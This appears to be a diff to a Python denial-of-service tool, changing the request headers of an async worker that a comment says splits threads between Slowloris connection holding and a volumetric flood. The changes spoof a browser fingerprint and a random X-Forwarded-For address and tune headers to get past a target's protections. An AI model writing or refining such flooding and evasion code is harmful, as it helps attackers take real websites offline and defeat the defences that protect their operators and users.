@@ -703,7 +703,8 @@ async def WorkerTask(counter, semaphore):
 	extra_headers = {
 		"User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.3{random.randint(0, 9)}",
 		"X-Forwarded-For": randomip,
-		"Accept-Language": "en-US,en;q=0.9",
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+		"Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
 		"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
 		"Sec-Ch-Ua-Mobile": "?0",
 		"Sec-Ch-Ua-Platform": "\"Windows\"",
@@ -711,8 +712,8 @@ async def WorkerTask(counter, semaphore):
 		"Sec-Fetch-Mode": "navigate",
 		"Sec-Fetch-Site": "none",
 		"Sec-Fetch-User": "?1",
-		"Cache-Control": "no-cache, no-store, must-revalidate", # Cache-busting
-		"Pragma": "no-cache"
+		"Upgrade-Insecure-Requests": "1", # Matches the target's CSP policy requirements
+		"Connection": "keep-alive" # Necessary for connection persistence vs their strict CORS
 	}
 
 	# 10% of threads will be dedicated to Slowloris connection holding, 90% for Volumetric Flood
